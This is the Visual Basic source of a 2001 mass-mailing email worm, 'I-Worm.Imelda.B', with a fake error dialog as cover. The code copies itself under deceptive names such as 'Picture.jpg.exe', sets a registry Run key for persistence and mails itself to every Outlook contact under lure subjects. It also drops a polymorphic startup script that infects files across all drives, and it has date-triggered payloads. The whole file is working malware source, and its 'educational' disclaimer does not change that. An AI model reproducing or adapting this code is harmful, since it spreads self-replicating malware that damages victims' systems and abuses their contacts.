VERSION 5.00
Begin VB.Form Worm2 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "File Open Error"
   ClientHeight    =   1440
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4980
   Icon            =   "Imelda-B.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1440
   ScaleWidth      =   4980
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command1 
      Caption         =   "OK"
      Height          =   375
      Left            =   1800
      TabIndex        =   2
      Top             =   960
      Width           =   1215
   End
   Begin VB.Image Image1 
      Height          =   480
      Left            =   120
      Picture         =   "Imelda-B.frx":030A
      Top             =   240
      Width           =   480
   End
   Begin VB.Label Label2 
      Caption         =   "If you Downloaded this file , try downloading the file again."
      Height          =   375
      Left            =   720
      TabIndex        =   1
      Top             =   600
      Width           =   4215
   End
   Begin VB.Label Label1 
      Caption         =   "Cannot Open files : It does not appear to be a valid archive"
      Height          =   375
      Left            =   720
      TabIndex        =   0
      Top             =   240
      Width           =   4215
   End
End
Attribute VB_Name = "Worm2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'I-Worm.Imelda.B@mm
'(C)2001, By. Iwing
'Indovirus - Indonesian Virus Group
'http://indovirus.8m.com IRC Dalnet #indovirus
'email: iwing@softhome.net - shadow_chaser@telkom.net
'
'WARNING
'Only For educational and research
'========================================================
Private Sub Command1_Click()
Unload Me
End Sub
Private Sub Form_Load()
On Error Resume Next
Dim sub1(8) As String
Dim sub2(5) As String
Dim sub3(4) As String
Dim sub4(13) As String
Dim Mysub As String

sub1(0) = "Have you "
sub1(1) = "You Should "
sub1(2) = "Just "
sub1(3) = "Why Not you "
sub1(4) = "How to "
sub1(5) = "Re: "
sub1(6) = "Fwd : "
sub1(7) = " "

sub2(0) = "Check "
sub2(1) = "Check out "
sub2(2) = "Watch out "
sub2(3) = "Open "
sub2(4) = "Look at "

sub3(0) = "this "
sub3(1) = "my "
sub3(2) = "For this "
sub3(3) = "The "

sub4(0) = "Picture"
sub4(1) = "Program"
sub4(2) = "Patch"
sub4(3) = "Nude pic"
sub4(4) = "Report"
sub4(5) = "Documment"
sub4(6) = "Quotation"
sub4(7) = "Transaction"
sub4(8) = "Bank Account"
sub4(9) = "WTC Tragedy"
sub4(10) = "Osama Vs Bush"
sub4(11) = "Account"
sub4(12) = "Private Pic"
Randomize
s1 = Int(Rnd * 8)
s2 = Int(Rnd * 5)
s3 = Int(Rnd * 4)
s4 = Int(Rnd * 13)

Dim Myself, Myfile, MyDir, Cln(8) As String
Dim StartPath As String
Cln(0) = "Setup.EXE": Cln(1) = "install.exe": Cln(2) = "Readme.exe": Cln(3) = "Files.exe": Cln(4) = "Picture.exe": Cln(5) = "Quotation.Doc.exe": Cln(6) = "Letter.Doc.exe": Cln(7) = "Picture.jpg.exe"

StartPath = "C:\WINDOWS\"
Myfile = App.EXEName & ".EXE"

For i = 0 To 8
FileCopy Myfile, StartPath & Cln(i)
Next

FileCopy Myfile, StartPath & "Update.exe"
Call MakeReg

Randomize
rr = Int(Rnd * 8)
MyCln = Cln(rr)
Mysub = sub1(s1) & sub2(s2) & sub3(s3) & sub4(s4)
Set outlook = CreateObject("Outlook.Application")
If outlook = "Outlook" Then
Set MAPI = outlook.GetNameSpace("MAPI")
Set MyAddress = MAPI.AddressLists
For Each Alamat In MyAddress
If Alamat.AddressEntries.Count <> 0 Then
NamaKu = Alamat.AddressEntries.Count
For i = 1 To NamaKu
Set pesan = outlook.CreateItem(0)
Set surat = Alamat.AddressEntries(i)
pesan.To = surat.Address
pesan.Subject = Mysub
pesan.Body = "Hi: " & vbCrLf & "This is the file you ask for, Please save it to disk and open this file, " & vbCrLf & " it's very important." & vbCrLf & ""
Fileku = StartPath & MyCln
pesan.attachments.Add Fileku

pesan.BCC = surat.Address(0)

pesan.DeleteAfterSubmit = True
If pesan.To <> "" Then
pesan.Send
End If
Next
End If
Next
End If

For nn = 1 To 8
Kill StartPath & Cln(nn)
Kill StartPath & Cln(nn)
Next
Call myMark
If Day(Now) = 1 Then
Do
Greetz.Show
Loop
End If
End Sub
Function MakeReg()
On Error Resume Next
Dim Myname As String
Myname = "c:\iwing.reg"
Open Myname For Output As #1
Print #1, "REGEDIT4"
Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]"
Print #1, """Update""=""C:\\WINDOWS\\Update.exe"""
Close 1
Shell "regedit /s c:\iwing.reg"
Kill "c:\iwing.reg"
End Function
Function myMark()
Dim Clab
Dim myscr As String
myscr = "C:\WINDOWS\STARTM~1\PROGRAMS\STARTUP\Update.vbs"
Open myscr For Output Access Write As #1
Print #1, "'I-WORM.IMELDA.B"
Print #1, "'Poly & Crypt - (C)2001, by Iwing"
Print #1, "'Virusindo - Indonesian Virus Network"
Print #1, "'http://indovirus.8m.com , IRC Dalnet #indovirus"
Print #1, "'==============================================="
Print #1, "Call REKIPV"
Print #1, "Set MGDBIC = CreateObject(""scripting.filesystemobject"")"
Print #1, "Call ALFGNO"
Print #1, "if day(now) = 12 then"
Print #1, "BFLRND = msgbox(""Hi there.., you are infected by some of"" & Chr(13) & _"
Print #1, """IWING creations.., have a nice day"","; 10; ",""I-WORM.IMELDA.B "")"
Print #1, "end if"
Print #1, "Function ALFGNO()"
Print #1, "On Error Resume Next"
Print #1, "Set JITGKA = MGDBIC.Drives"
Print #1, "For Each RDJGGH In  JITGKA"
Print #1, "EVGFTR = RDJGGH & ""\"""
Print #1, "Call ILOVJU(EVGFTR)"
Print #1, "Next"
Print #1, "End Function"
Print #1, "Function ILOVJU(VGGSIG)"
Print #1, "FIKMFN = VGGSIG"
Print #1, "Set CIKKTD = MGDBIC.GetFolder(FIKMFN)"
Print #1, "Set ECECIG =  CIKKTD.Files"
Print #1, "For Each  VENVAA In ECECIG"
Print #1, "If MGDBIC.GetExtensionName(VENVAA.Path) = ""EXE"" Then"
Print #1, "MGDBIC.CopyFile wscript.scriptfullname, VENVAA.Path & "".vbs"", True"
Print #1, "End If"
Print #1, "If MGDBIC.GetExtensionName(VENVAA.Path) = ""DOC"" Then"
Print #1, "MGDBIC.CopyFile wscript.scriptfullname, VENVAA.Path & "".vbs"", True"
Print #1, "End If"
Print #1, "If MGDBIC.GetExtensionName(VENVAA.Path) = ""DLL"" Then"
Print #1, "MGDBIC.CopyFile wscript.scriptfullname, VENVAA.Path & "".vbs"", True"
Print #1, "End If"
Print #1, "If MGDBIC.GetExtensionName(VENVAA.Path) = ""TXT"" Then"
Print #1, "MGDBIC.CopyFile wscript.scriptfullname, VENVAA.Path & "".vbs"", True"
Print #1, "End If"
Print #1, "Next"
Print #1, "Set RENJAO = CIKKTD.Subfolders"
Print #1, "For Each  FTBNJH In RENJAO"
Print #1, "Call ILOVJU(FTBNJH.Path)"
Print #1, "Next"
Print #1, "End Function"
Print #1, "function REKIPV"
Print #1, "Randomize"
Print #1, "Set CVPRGL = CreateObject(""scripting.filesystemobject"")"
Print #1, "Set QSEVCQL = CVPRGL.OpenTextFile(WScript.ScriptFullName, 1)"
Print #1, "HBMHAD = QSEVCQL.Readall"
Print #1, "ECCVQK = ""MGDBIC ALFGNO BFLRND JITGKA RDJGGH EVGFTR ILOVJU FIKMFN VGGSIG VENVAA ECECIG RENJAO FTBNJH REKIPV CVPRGL QSEVCQ HBMHAD ECCVQK TTIAKC GRTMTI QSEVCQL CIKKTD """
Print #1, "Do"
Print #1, "TTIAKC = Left(ECCVQK, InStr(ECCVQK, Chr(32)) - 1)"
Print #1, "ECCVQK = Mid(ECCVQK, InStr(ECCVQK, Chr(32)) + 1)"
Print #1, "VNOFVA = Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65))"
Print #1, "Do"
Print #1, "GRTMTI = InStr(GRTMTI + 1, HBMHAD, TTIAKC)"
Print #1, "If GRTMTI Then HBMHAD = Mid(HBMHAD, 1, (GRTMTI - 1)) & VNOFVA & Mid(HBMHAD, (GRTMTI + Len(TTIAKC)))"
Print #1, "Loop While GRTMTI"
Print #1, "Loop While ECCVQK <> """""
Print #1, "Set QSEVCQL = CVPRGL.OpenTextFile(WScript.ScriptFullName, 2, True)"
Print #1, "QSEVCQL.Writeline HBMHAD"
Print #1, "end function"

Close #1

If Day(Now) = 12 Then
Clab = Shell("LABEL C: IMELDA", vbHide)
End If
End Function

